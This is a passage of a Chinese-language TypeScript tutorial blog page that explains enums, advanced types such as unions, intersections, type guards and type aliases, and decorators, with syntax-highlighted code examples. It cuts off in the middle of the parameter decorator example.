+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Direction &#123;</span><br><span class="line">    Up,</span><br><span class="line">    Down,</span><br><span class="line">    Left,</span><br><span class="line">    Right</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Up)	<span class="comment">// 0</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Down)	<span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Left)	<span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Right) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="字符串枚举"><a href="#字符串枚举" class="headerlink" title="字符串枚举"></a>字符串枚举</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Direction &#123;</span><br><span class="line">    Up = <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    Down = <span class="string">&quot;DOWN&quot;</span>,</span><br><span class="line">    Left = <span class="string">&quot;LEFT&quot;</span>,</span><br><span class="line">    Right = <span class="string">&quot;RIGHT&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="异构枚举"><a href="#异构枚举" class="headerlink" title="异构枚举"></a>异构枚举</h6><p>枚举可以混合字符串和数字成员，但是不推荐这么做</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum BooleanLikeHeterogeneousEnum &#123;</span><br><span class="line">    No = <span class="number">0</span>,</span><br><span class="line">    Yes = <span class="string">&quot;YES&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="5、高级类型"><a href="#5、高级类型" class="headerlink" title="5、高级类型"></a>5、高级类型</h5><h6 id="交叉类型"><a href="#交叉类型" class="headerlink" title="交叉类型"></a>交叉类型</h6><p>交叉类型是将多个类型合并为一个类型， 例如， <code>Person &amp; Serializable &amp; Loggable</code>同时是 <code>Person</code> <em>和</em> <code>Serializable</code> <em>和</em> <code>Loggable</code>。 就是说这个类型的对象同时拥有了这三种类型的成员。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extend</span>&lt;<span class="title">T</span>, <span class="title">U</span>&gt;(<span class="params">first: T, second: U</span>): <span class="title">T</span> &amp; <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="xml"><span class="tag">&lt;<span class="name">T</span> &amp; <span class="attr">U</span>&gt;</span>&#123;&#125;;</span></span><br><span class="line"><span class="xml">    for (let id in first) &#123;</span></span><br><span class="line">        (&lt;any&gt;result)[id] = (&lt;any&gt;first)[id];</span><br><span class="line">    &#125;</span><br><span class="line">    for (let id in second) &#123;</span><br><span class="line">        if (!result.hasOwnProperty(id)) &#123;</span><br><span class="line">            (&lt;any&gt;result)[id] = (&lt;any&gt;second)[id];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Person &#123;</span><br><span class="line">    constructor(public name: string) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line">interface Loggable &#123;</span><br><span class="line">    log(): void;</span><br><span class="line">&#125;</span><br><span class="line">class ConsoleLogger implements Loggable &#123;</span><br><span class="line">    log() &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var jim = extend(new Person(&quot;Jim&quot;), new ConsoleLogger());</span><br><span class="line">var n = jim.name;</span><br><span class="line">jim.log();</span><br></pre></td></tr></table></figure>
+
+<h6 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h6><p>表示或的意思，可以是联合类型中的任意一种类型。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">arg: string | number</span>) </span>&#123;<span class="comment">// 使用联合类型，传入的参数既可以是字符串也可以是number</span></span><br><span class="line">    <span class="built_in">console</span>.log(arg)</span><br><span class="line">&#125;</span><br><span class="line">showInfo(<span class="string">&#x27;test&#x27;</span>);	<span class="comment">// √</span></span><br><span class="line">showInfo(<span class="number">10</span>);		<span class="comment">// √</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="类型保护"><a href="#类型保护" class="headerlink" title="类型保护"></a>类型保护</h6><p><code>typeof</code>类型保护</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">padLeft</span>(<span class="params">value: string, padding: string | number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> padding === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>(padding + <span class="number">1</span>).join(<span class="string">&quot; &quot;</span>) + value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> padding === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> padding + value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Expected string or number, got &#x27;<span class="subst">$&#123;padding&#125;</span>&#x27;.`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>in</code>类型保护</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Driver &#123;</span><br><span class="line">  drive: <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Teacher &#123;</span><br><span class="line">  teach: <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judgeCareer</span>(<span class="params">careerObj: Waiter | Teacher</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&quot;teach&quot;</span> <span class="keyword">in</span> careerObj) &#123;</span><br><span class="line">    careerObj.teach();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    careerObj.drive();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>instanceof</code>类型保护</p>
+<blockquote>
+<p><em><code>instanceof</code>类型保护</em>是通过构造函数来细化类型的一种方式</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Padder &#123;</span><br><span class="line">    getPaddingString(): string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpaceRepeatingPadder</span> <span class="title">implements</span> <span class="title">Padder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(private numSpaces: number) &#123; &#125;</span><br><span class="line">    getPaddingString() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.numSpaces + <span class="number">1</span>).join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringPadder</span> <span class="title">implements</span> <span class="title">Padder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(private value: string) &#123; &#125;</span><br><span class="line">    getPaddingString() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomPadder</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.random() &lt; <span class="number">0.5</span> ?</span><br><span class="line">        <span class="keyword">new</span> SpaceRepeatingPadder(<span class="number">4</span>) :</span><br><span class="line">        <span class="keyword">new</span> StringPadder(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型为SpaceRepeatingPadder | StringPadder</span></span><br><span class="line"><span class="keyword">let</span> padder: Padder = getRandomPadder();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (padder <span class="keyword">instanceof</span> SpaceRepeatingPadder) &#123;</span><br><span class="line">    padder; <span class="comment">// 类型细化为&#x27;SpaceRepeatingPadder&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (padder <span class="keyword">instanceof</span> StringPadder) &#123;</span><br><span class="line">    padder; <span class="comment">// 类型细化为&#x27;StringPadder&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h6><p>使用<code>值 as type</code></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMsg</span>(<span class="params">obj: string | number</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log((obj <span class="keyword">as</span> string).substr(<span class="number">1</span>));</span><br><span class="line">    <span class="built_in">console</span>.log((obj <span class="keyword">as</span> number).toFixed(<span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>&lt;type&gt;值</code></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMsg</span>(<span class="params">obj: string | number</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log((<span class="xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>obj).substr(1));</span></span><br><span class="line">    console.log(&lt;number&gt;obj).toFixed(2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h6><p>类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。起别名不会新建一个类型，它创建了一个新名字来引用那个类型</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type Name = string;</span><br><span class="line">type NameResolver = <span class="function">() =&gt;</span> string;</span><br><span class="line">type NameOrResolver = Name | NameResolver;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">n: NameOrResolver</span>): <span class="title">Name</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> n === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> n();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同接口一样，类型别名也可以是泛型</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type Container&lt;T&gt; = &#123; <span class="attr">value</span>: T &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用类型别名来在属性里引用自己，常用于树状结构</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type Tree&lt;T&gt; = &#123;</span><br><span class="line">    value: T;</span><br><span class="line">    left: Tree&lt;T&gt;;</span><br><span class="line">    right: Tree&lt;T&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="接口和类型别名的差别"><a href="#接口和类型别名的差别" class="headerlink" title="接口和类型别名的差别"></a>接口和类型别名的差别</h6><p>1.接口创建了一个新的名字，可以在其它任何地方使用。 类型别名并不创建新名字—比如，错误信息就不会使用别名</p>
+<p>下面的代码中，在编译器中将鼠标悬停在 <code>interfaced</code>上，显示它返回的是 <code>Interface</code>，但悬停在 <code>aliased</code>上时，显示的却是对象字面量类型</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">type Alias = &#123; <span class="attr">num</span>: number &#125;</span><br><span class="line">interface Interface &#123;</span><br><span class="line">    num: number;</span><br><span class="line">&#125;</span><br><span class="line">declare <span class="function"><span class="keyword">function</span> <span class="title">aliased</span>(<span class="params">arg: Alias</span>): <span class="title">Alias</span>;</span></span><br><span class="line"><span class="function"><span class="title">declare</span> <span class="title">function</span> <span class="title">interfaced</span>(<span class="params">arg: Interface</span>): <span class="title">Interface</span>;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.类型别名不能被 <code>extends</code>和 <code>implements</code>（自己也不能 <code>extends</code>和 <code>implements</code>其它类型）。 因为软件中的对象应该对于扩展是开放的，但是对于修改是封闭的，你应该尽量去使用接口代替类型别名</p>
+<h6 id="可辨识联合"><a href="#可辨识联合" class="headerlink" title="可辨识联合"></a>可辨识联合</h6><ul>
+<li><p>具有普通的单例类型属性-可辨识的特征。</p>
+</li>
+<li><p>一个类型别名包含了那些类型的联合-联合。</p>
+</li>
+<li><p>此属性上的类型保护。</p>
+</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Square &#123;</span><br><span class="line">    kind: <span class="string">&quot;square&quot;</span>;</span><br><span class="line">    size: number;</span><br><span class="line">&#125;</span><br><span class="line">interface Rectangle &#123;</span><br><span class="line">    kind: <span class="string">&quot;rectangle&quot;</span>;</span><br><span class="line">    width: number;</span><br><span class="line">    height: number;</span><br><span class="line">&#125;</span><br><span class="line">interface Circle &#123;</span><br><span class="line">    kind: <span class="string">&quot;circle&quot;</span>;</span><br><span class="line">    radius: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Shape = Square | Rectangle | Circle;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">s: Shape</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (s.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;square&quot;</span>: <span class="keyword">return</span> s.size * s.size;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;rectangle&quot;</span>: <span class="keyword">return</span> s.height * s.width;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;circle&quot;</span>: <span class="keyword">return</span> <span class="built_in">Math</span>.PI * s.radius ** <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="6、装饰器"><a href="#6、装饰器" class="headerlink" title="6、装饰器"></a>6、装饰器</h5><blockquote>
+<p>随着TypeScript和ES6里引入了类，在一些场景下我们需要额外的特性来支持标注或修改类及其成员。 装饰器（Decorators）为我们在类的声明及成员上通过元编程语法添加标注提供了一种方式。装饰器属性是一项试验性特性，要想使用该特性，需要再命令行或者配置文件<code>tsconfig.json</code>里面启用<code>experimentalDecorators</code>编译器选项。</p>
+</blockquote>
+<h6 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tsc --target ES5 --experimentalDecorators</span><br></pre></td></tr></table></figure>
+
+<h6 id="配置文件tsconfig-json"><a href="#配置文件tsconfig-json" class="headerlink" title="配置文件tsconfig.json"></a>配置文件<code>tsconfig.json</code></h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;target&quot;</span>: <span class="string">&quot;ES5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;experimentalDecorators&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、访问符、属性、参数上。 装饰器使用 <code>@expression</code>这种形式，<code>expression</code>求值后必须为一个函数，它会在运行时被调用，被装饰的声明信息做为参数传入。</p>
+</blockquote>
+<h6 id="定义一个装饰器"><a href="#定义一个装饰器" class="headerlink" title="定义一个装饰器"></a>定义一个装饰器</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logStr</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@logStr</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="装饰器工厂"><a href="#装饰器工厂" class="headerlink" title="装饰器工厂"></a>装饰器工厂</h6><p>装饰器工厂就是一个简单的函数，返回一个表达式，以供装饰器在运行时调用</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logStr</span>(<span class="params">msg: string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// do something with target and msg</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@logStr(<span class="string">&#x27;this is a decorator func&#x27;</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="装饰器组合"><a href="#装饰器组合" class="headerlink" title="装饰器组合"></a>装饰器组合</h6><p>多个装饰器可以同时应用到一个声明上</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@aaaa</span><br><span class="line">@bbb</span><br><span class="line">@ccc</span><br><span class="line">@ddd</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<p>在Typescript中，当多个装饰器应用到同一个声明中时，会进行以下步骤的操作</p>
+<ul>
+<li>由上到下依次对装饰器表达式求值</li>
+<li>求值的结果会被当做函数，由下到上依次调用</li>
+</ul>
+<p>使用装饰器工厂的时候，求值的顺序时由上到下，调用的顺序是由下到上。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;f(): evaluated&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target, propertyKey: string, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;f(): called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;g(): evaluated&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target, propertyKey: string, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;g(): called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    @f()</span><br><span class="line">    @g()</span><br><span class="line">    method() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行结果如下</span></span><br><span class="line">f(): evaluated</span><br><span class="line">g(): evaluated</span><br><span class="line">g(): called</span><br><span class="line">f(): called</span><br></pre></td></tr></table></figure>
+
+<h6 id="装饰器求值"><a href="#装饰器求值" class="headerlink" title="装饰器求值"></a>装饰器求值</h6><p>类中不同声明上的装饰器将按以下规定的顺序应用</p>
+<ul>
+<li><p>参数装饰器，然后依次是方法装饰器，访问符装饰器，或属性装饰器应用到每个实例成员</p>
+</li>
+<li><p>参数装饰器，然后依次是方法装饰器，访问符装饰器，或属性装饰器应用到每个静态成员</p>
+</li>
+<li><p>参数装饰器应用到构造函数</p>
+</li>
+<li><p>类装饰器应用到类</p>
+</li>
+</ul>
+<h6 id="类装饰器"><a href="#类装饰器" class="headerlink" title="类装饰器"></a>类装饰器</h6><p>在类声明之前被声明，应用于类构造函数，可以用来监视，修改或替换类定义</p>
+<p>类装饰器表达式会在运行时当作函数被调用，<strong>类的构造函数作为其唯一的参数</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义类装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sealed</span>(<span class="params">constructor: Function</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">Object</span>.seal(<span class="keyword">constructor</span>);</span><br><span class="line">    Object.seal(<span class="keyword">constructor</span>.prototype);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 使用类装饰器</span><br><span class="line">@sealed</span><br><span class="line">class Greeter &#123;</span><br><span class="line">    greeting: string;</span><br><span class="line">    <span class="keyword">constructor</span>(message: string) &#123;</span><br><span class="line">        <span class="built_in">this</span>.greeting = message;</span><br><span class="line">    &#125;</span><br><span class="line">    greet() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + <span class="built_in">this</span>.greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当@sealed被执行的时候，它将密封此类的构造函数和原型</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="方法装饰器"><a href="#方法装饰器" class="headerlink" title="方法装饰器"></a>方法装饰器</h6><p>声明在一个方法的声明之前，可以用来监视，修改或者替换方法定义</p>
+<p>方法装饰器表达式会在运行时当作函数被调用，传入3个参数：</p>
+<ul>
+<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象</li>
+<li>成员的名字</li>
+<li>成员的属性描述符</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义方法装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enumerable</span>(<span class="params">value: boolean</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target: any, propertyKey: string, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">        descriptor.enumerable = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">    greeting: string;</span><br><span class="line">    <span class="keyword">constructor</span>(message: string) &#123;</span><br><span class="line">        <span class="built_in">this</span>.greeting = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用方法装饰器</span></span><br><span class="line">    @enumerable(<span class="literal">false</span>)</span><br><span class="line">    greet() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + <span class="built_in">this</span>.greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上代码，当装饰器被调用的时候，会修改属性描述符的<code>enumerable</code>属性</p>
+<h6 id="访问器装饰器"><a href="#访问器装饰器" class="headerlink" title="访问器装饰器"></a>访问器装饰器</h6><p>声明在一个访问器的声明之前，可以用来监视，修改或替换一个访问器的定义</p>
+<p>访问器装饰器表达式会在运行时当作函数被调用，传入3个参数：</p>
+<ul>
+<li>对于静态成员来说是类的构造函数，对于实例成员来说是类的原型对象</li>
+<li>成员的名字</li>
+<li>成员的属性描述符</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义访问器装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">configurable</span>(<span class="params">value: boolean</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target: any, propertyKey: string, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">        descriptor.configurable = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    private _x: number;</span><br><span class="line">    private _y: number;</span><br><span class="line">    <span class="keyword">constructor</span>(x: number, y: number) &#123;</span><br><span class="line">        <span class="built_in">this</span>._x = x;</span><br><span class="line">        <span class="built_in">this</span>._y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用访问器装饰器</span></span><br><span class="line">    @configurable(<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">get</span> <span class="title">x</span>() &#123; <span class="keyword">return</span> <span class="built_in">this</span>._x; &#125;</span><br><span class="line"></span><br><span class="line">    @configurable(<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">get</span> <span class="title">y</span>() &#123; <span class="keyword">return</span> <span class="built_in">this</span>._y; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="属性装饰器"><a href="#属性装饰器" class="headerlink" title="属性装饰器"></a>属性装饰器</h6><p>声明在一个属性声明之前</p>
+<p>属性装饰器表达式会在运行时当作函数被调用，传入下列2个参数：</p>
+<ul>
+<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象</li>
+<li>成员的名字</li>
+</ul>
+<p>记录属性的元数据</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;reflect-metadata&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formatMetadataKey = <span class="built_in">Symbol</span>(<span class="string">&quot;format&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义@format装饰器和getFormat函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">formatString: string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.metadata(formatMetadataKey, formatString);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFormat</span>(<span class="params">target: any, propertyKey: string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.getMetadata(formatMetadataKey, target, propertyKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">    @format(<span class="string">&quot;Hello, ts&quot;</span>)</span><br><span class="line">    greeting: string;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(message: string) &#123;</span><br><span class="line">        <span class="built_in">this</span>.greeting = message;</span><br><span class="line">    &#125;</span><br><span class="line">    greet() &#123;</span><br><span class="line">        <span class="keyword">let</span> formatString = getFormat(<span class="built_in">this</span>, <span class="string">&quot;greeting&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> formatString.replace(<span class="string">&quot;ts&quot;</span>, <span class="built_in">this</span>.greeting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="参数装饰器"><a href="#参数装饰器" class="headerlink" title="参数装饰器"></a>参数装饰器</h6><p>声明在一个参数声明之前</p>
+<p>参数装饰器表达式会在运行时当作函数被调用，传入下列3个参数：</p>
+<ul>
+<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象</li>
+<li>成员的名字</li>
+<li>参数在函数参数列表中的索引</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;reflect-metadata&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> requiredMetadataKey = <span class="built_in">Symbol</span>(<span class="string">&quot;required&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">required</span>(<span class="params">target: Object, propertyKey: string | symbol, parameterIndex: number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> existingRequiredParameters: number[] = <span class="built_in">Reflect</span>.getOwnMetadata(requiredMetadataKey, target, propertyKey) || [];</span><br><span class="line">    existingRequiredParameters.push(parameterIndex);</span><br><span class="line">    <span class="built_in">Reflect</span>.defineMetadata(requiredMetadataKey, existingRequiredParameters, target, propertyKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">target: any, propertyName: string, descriptor: TypedPropertyDescriptor&lt;Function&gt;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> method = descriptor.value;</span><br><span class="line">    descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> requiredParameters: number[] = <span class="built_in">Reflect</span>.getOwnMetadata(requiredMetadataKey, target, propertyName);</span><br><span class="line">        <span class="keyword">if</span> (requiredParameters) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> parameterIndex <span class="keyword">of</span> requiredParameters) &#123;</span><br><span class="line">                <span class="keyword">if</span> (parameterIndex &gt;= <span class="built_in">arguments</span>.length || <span class="built_in">arguments</span>[parameterIndex] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Missing required argument.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> method.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 